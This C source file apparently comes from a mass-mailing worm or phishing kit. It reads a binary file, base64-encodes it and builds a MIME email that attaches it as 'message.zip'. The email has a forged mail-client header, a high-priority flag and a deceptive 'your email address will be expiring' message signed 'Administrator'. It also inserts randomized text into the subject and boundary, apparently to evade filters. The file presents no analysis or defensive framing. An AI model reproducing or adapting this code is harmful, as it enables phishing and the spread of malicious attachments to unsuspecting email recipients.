   #include <windows.h>
   #include <stdio.h>

   static const char basis_64[] =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
   char alpha[] = "aweriouiopasafihokozavbnmcabcdefghijklmnopqrstuvwxyzoeioaearieao";

   char *base64_encode(char *binStr, unsigned int len);
   int get_boundary(char *);
   int get_random_text(char *buf2,int j);
   char *get_message_body(char *fname);

   #define IN_FILE  "in.bin"

   /*#include "crc32.c"

   int main(void){
       char *msg;
       crc32_init();
       msg = get_message_body(IN_FILE);
       if(!msg) { printf("Error!!!\n"); return 1; }
       printf("%s",msg);
       if(msg) free(msg);
       return 0;
   }*/


   char *get_message_body(char *fname)
   {
       FILE *in = fopen(fname,"rb");
       if(in == NULL) { return 0; }

       int in_file_len =  _filelength(_fileno(in));
       char *buf = (char *)malloc(in_file_len);
       if(!buf) { return 0; }

       fread(buf,1,in_file_len,in);
       char *pszEncodedText = base64_encode(buf,in_file_len);

       char *pszMessage = malloc(in_file_len*3+10240);
       char boundary[256];
       char random1[256];
       char random2[256];
       get_boundary(boundary);
       get_random_text(random1,0);
       get_random_text(random2,0);

       sprintf(pszMessage,\
           "X-Mailer: The Bat! (v1.61)\n"\
           "X-Priority: 2 (High)\n"\
           "Subject: your account                         %s\n"\
           "MIME-Version: 1.0\n"\
           "Content-Type: multipart/mixed; boundary=\"%s\"\n\n"\
           "--%s\n"\
           "Content-Type: text/plain; charset=us-ascii\n"\
           "Content-Transfer-Encoding: 7bit\n\n\n"\
           "Hello there,\n\n"\
           "I would like to inform you about important information regarding your\n"\
           "email address. This email address will be expiring.\n"\
           "Please read attachment for details.\n\n"\
           "---\n"\
           "Best regards, Administrator\n%s\n\n"\
           "--%s\n"\
           "Content-Type: application/x-zip-compressed; name=\"message.zip\"\n"\
           "Content-Transfer-Encoding: base64\n"\
           "Content-Disposition: attachment; filename=\"message.zip\"\n\n"\
           "%s\n\n--%s--\n"\
       ,random1,boundary,boundary,random2,boundary,pszEncodedText,boundary);

       //printf("%s",pszMessage);

       //if(pszMessage) free(pszMessage);
       if(pszEncodedText) free(pszEncodedText);
       if(buf) free(buf);
       fclose(in);
       return pszMessage;
   }

   char *base64_encode(char *binStr, unsigned int len)
   {
       char * buf;
       int buflen = 0;
       int c1, c2, c3;
       int maxbuf;
       int cnt = 0;

       maxbuf = len*3 + 20;  /* size after expantion */

       if((buf = malloc(maxbuf)) == NULL)
           return NULL;

       while (len) {
           cnt++;
           c1 = (unsigned char)*binStr++;
           buf[buflen++] = basis_64[c1>>2];
           if (--len == 0) c2 = 0;
           else c2 = (unsigned char)*binStr++;

           buf[buflen++] = basis_64[((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4)];
           if (len == 0) {
               buf[buflen++] = '=';
               buf[buflen++] = '=';
               break;
           }

           if (--len == 0) c3 = 0;
           else c3 = (unsigned char)*binStr++;

           buf[buflen++] = basis_64[((c2 & 0xF) << 2) | ((c3 & 0xC0) >>6)];
           if (len == 0) {
               buf[buflen++] = '=';
               break;
           }

           --len;
           buf[buflen++] = basis_64[c3 & 0x3F];

           if(cnt == 19) {
               cnt = 0;
               buf[buflen] = 0x0d;
               buf[buflen++] = 0x0a;
           }
       }
       buf[buflen]=0;
       return buf;
   }

   int get_random_text(char *buf2,int j){
       char txt[10];
       unsigned char a;
       unsigned long rand;
       unsigned long x1 = GetTickCount();

       rand = crc32(j,(unsigned char *)&x1,4);

       a = rand;
       txt[0] = alpha[a>>2];
       a = rand>>8;
       txt[1] = alpha[a>>2];
       a = rand>>16;
       txt[2] = alpha[a>>2];
       a = rand>>32;
       txt[3] = alpha[a>>2];

       a = x1;
       txt[4] = alpha[a>>2];
       a = x1>>8;
       txt[5] = alpha[a>>2];
       a = x1>>16;
       txt[6] = alpha[a>>2];
       a = x1>>32;
       txt[7] = alpha[a>>2];
       txt[8] = 0;

       strncpy(buf2,txt,255);
       return 0;
   }

   int get_boundary(char *buf_to_copy){
       char buf1[32];
       unsigned long x1 = GetTickCount();

       sprintf(buf1,"%.8X%.8X",crc32(0,(unsigned char *)&x1,4),x1);
       buf1[strlen(buf1)-1] = 0;
       sprintf(buf_to_copy,"----------%s",buf1);

       return 0;
   }
